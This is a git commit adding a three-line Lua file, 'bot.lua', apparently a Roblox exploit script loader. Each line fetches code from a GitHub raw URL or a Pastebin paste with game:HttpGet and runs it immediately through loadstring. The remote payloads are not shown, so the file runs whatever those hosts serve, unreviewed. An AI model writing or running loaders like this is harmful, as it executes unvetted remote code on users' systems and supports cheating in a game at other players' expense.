8b20fa890b63ac440677d7eff1276935899ebf5a
tonpereaveclelait <antriwassim18@gmail.com>
2026-06-29 19:14:40 +0100

    Add files via upload

---
+++ bot.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bucknbilly/scripts/refs/heads/main/Banana.lua"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/hPzhWZis"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/xuL0gvHU"))()
